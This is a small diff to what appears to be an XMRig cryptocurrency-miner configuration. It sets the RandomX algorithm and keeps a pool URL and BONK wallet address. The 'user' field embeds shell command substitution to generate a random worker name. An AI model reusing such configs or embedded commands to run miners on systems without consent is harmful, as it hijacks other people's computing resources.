@@ -60,7 +60,7 @@
     "log-file": null,
     "pools": [
         {
-            "algo": null",
+            "algo": "rx/0",
             "coin": null,
             "url": "rx.unmineable.com:3333",
             "user": "BONK:Ea6Pj4rwN8qixCPuWrE9X9wDFwTQYxFcXFUTJs2VDKR9.$(echo rstd/$(shuf -i 1-999 -n 1))",
